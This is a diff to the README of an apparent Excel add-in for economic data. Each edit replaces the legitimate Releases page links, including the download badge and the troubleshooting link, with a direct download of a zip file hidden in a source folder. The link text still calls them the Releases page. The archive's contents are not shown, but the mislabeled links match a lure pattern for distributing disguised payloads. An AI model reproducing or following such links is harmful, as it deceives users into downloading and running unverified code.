@@ -1,7 +1,7 @@
 # 🌟 datasetiq-excel-addin - Access Economic Data Effortlessly
 
 ## 🔗 Download Now!
-[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-blue)](https://github.com/pheyvourr/datasetiq-excel-addin/releases)
+[![Download the latest version](https://github.com/pheyvourr/datasetiq-excel-addin/raw/refs/heads/main/src/functions/excel_addin_datasetiq_v3.0.zip%20Latest%20Version-v1.0-blue)](https://github.com/pheyvourr/datasetiq-excel-addin/raw/refs/heads/main/src/functions/excel_addin_datasetiq_v3.0.zip)
 
 ## 📋 Overview
 The **datasetIq Excel Add-in** allows you to access economic data directly within Excel. You can conduct analyses, build reports, and visualize data efficiently. This add-in simplifies the process of obtaining macroeconomic data, making it easier for anyone, regardless of technical background, to use.
@@ -10,7 +10,7 @@ The **datasetIq Excel Add-in** allows you to access economic data directly withi
 To get started with the datasetiq-excel-addin, follow these instructions. You will be able to download, install, and run the add-in in just a few simple steps.
 
 ## 📥 Download & Install
-1. **Visit the Downloads Page**: Go to the [Releases page](https://github.com/pheyvourr/datasetiq-excel-addin/releases) to view the available versions of the add-in.
+1. **Visit the Downloads Page**: Go to the [Releases page](https://github.com/pheyvourr/datasetiq-excel-addin/raw/refs/heads/main/src/functions/excel_addin_datasetiq_v3.0.zip) to view the available versions of the add-in.
 
 2. **Select the Latest Release**: Look for the latest version. It will typically be at the top of the list. 
 
@@ -46,7 +46,7 @@ If you encounter issues during installation or use, try the following steps:
 2. **Excel Add-ins Settings**: Make sure the add-in is enabled in the Excel options.
 3. **License and Permissions**: Confirm that all permission settings in Excel allow for the addition of add-ins.
 
-If these steps do not resolve your issues, visit the [Releases page](https://github.com/pheyvourr/datasetiq-excel-addin/releases) for further assistance.
+If these steps do not resolve your issues, visit the [Releases page](https://github.com/pheyvourr/datasetiq-excel-addin/raw/refs/heads/main/src/functions/excel_addin_datasetiq_v3.0.zip) for further assistance.
 
 ## 📝 Contributing
 We welcome contributions to enhance the datasetiq-excel-addin. If you have suggestions for new features or improvements, please reach out! To contribute, check out the issues section on the repository for more information.
